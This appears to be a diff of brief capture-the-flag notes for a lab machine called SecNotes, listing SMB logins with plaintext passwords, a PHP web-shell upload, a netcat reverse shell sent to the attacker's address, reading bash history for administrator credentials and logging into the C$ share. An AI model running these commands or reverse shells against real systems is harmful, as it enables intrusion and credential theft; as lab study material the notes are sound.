@@ -19,4 +19,21 @@ smbmap -d secnotes.htb -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97
 smbclient -U tyler -L //10.10.10.97
 
 smbclient -U tyler //10.10.10.97/new-site
-	!nc -nv myIp 4444 -e cmd.exe
+
+upload php shell	
+
+go to http://10.10.10.97:8808/shell.php?cmd=nc -nv [myIp] 4444 -e cmd.exe
+
+open on attacker machine ncat -l 4444
+
+Got shell!
+
+search for bash.exe with -> dir bash.exe /s /p
+
+execute it, cat ~/.bash_history
+
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
+
+login smbclient with credentials found there and get root.txt
+
+
